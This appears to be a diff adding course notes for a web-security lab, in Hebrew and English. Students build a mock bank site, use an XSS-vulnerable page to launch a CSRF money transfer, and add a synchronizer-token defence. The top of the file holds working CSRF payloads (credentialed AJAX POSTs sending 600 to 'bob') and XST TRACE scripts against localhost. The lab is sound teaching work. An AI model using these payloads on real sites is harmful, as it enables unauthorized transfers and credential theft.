@@ -1,0 +1,61 @@
+﻿התקפות 
+without token:
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script>$.ajax({type: 'POST',url: 'http://localhost:3000/transfer',data:{'dest':'bob','amount':'600'},xhrFields:{ withCredentials: true},success:function(msg){}});</script>
+
+
+with token:
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script>$.ajax({type: 'POST',url: 'http://localhost:3000/tokenTransfer',crossDomain: true,data:{'dest':'bob','amount':'600'},xhrFields:{ withCredentials: true},success:function(msg){}});</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script>$.ajax({type: 'POST',url: 'http://localhost:3000/tokenTransfer',data:{'dest':'bob','amount':'600'},xhrFields:{ withCredentials: true},success:function(msg){}});</script>
+
+
+
+
+XST-Trace request 
+<script type="text/javascript">if(window.XMLHttpRequest){var xmlhttp = new XMLHttpRequest();}else{var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}xmlhttp.onreadystatechange = function(){if((xmlhttp.readyState==4)&&(xmlhttp.status==200)){alert(xmlhttp.responseText);}}xmlhttp.open("TRACE","http://localhost:3000",true);xmlhttp.send();</script>
+
+
+<script>var xmlhttp = new XMLHttpRequest();var url='http://localhost:3000';xmlhttp.withCredentials = true;xmlhttp.open('TRACE', url, false);xmlhttp.send();if(xmlhttp.status==200){alert(xmlhttp.responeText);}</script>
+
+
+
+
+
+
+איפיון מטרה 
+המטרה שלכם:
+ 
+1)      לפתח אתר נוסף המדמה אתר בנק:
+ 
+o        חלון Login המבצע אוטנטיקציה – ניתן להשתמש ב- https://blog.risingstack.com/node-hero-node-js-authentication-passport-js/
+o        האתר יכיל דף Form (ניתן להזניק את הטופס באמצעות כפתור או בכל דרך אחרת, לאחר שבוצע Login)
+o        המשתמש יזין שתי שדות: סכום כסף להעברה, מספר חשבון אליו יועבר הכסף
+o        בעת קבלת הנתונים באתר, תרשם שורה ללוג עם הנתונים שהתקבלו.  (אפשר פשוט לרשום ל- (Console.Log
+o        ייתכן ותדרשו להגדיר Header באתר ההופך אותו לפגיע (אפשר לנסות גם בלי
+ 
+2)      להשתמש באתר הפגיע ל – XSS אשר פיתחתם בכדי להפעיל התקפה על אתר הבנק
+o        העברה של כספים בלא ידיעת המשתמש
+o        שימו לב מהם התנאים בהם התקפה זו יכולה להצליח
+ 
+3)      לממש הגנה לתקיפה זו באמצעות שיטת CSRF-TOKEN (המכונה במאגר Syncronizer Token)
+
+
+
+
+-          תהליך ה – Authentication הוא חלק חשוב בפרויקט. ראיתי שיש קשיים אצל חלק מכם. בקישור הבא יש הסבר על הגדרת passport במוד מקומי
+ 
+https://scotch.io/tutorials/easy-node-authentication-setup-and-local
+https://github.com/passport/express-4.x-local-example/blob/master/server.js
+ 
+-          לגבי ה – CSRF  מ – דומיין אחר
+ 
+o        מציע לכם תחילה לבדוק שההתקפה עובדת מאותו דומיין, או דומיין בן (blog.bank.com תוקף את bank.com)
+o        הנחיות לגבי ה – Allow-Origin  
+ 
+https://enable-cors.org/server_expressjs.html
+ 
+ 
+-          חשוב לבדוק את ההקפה מכמה Browsers שונים, ראינו שיש הבדל ביכולות
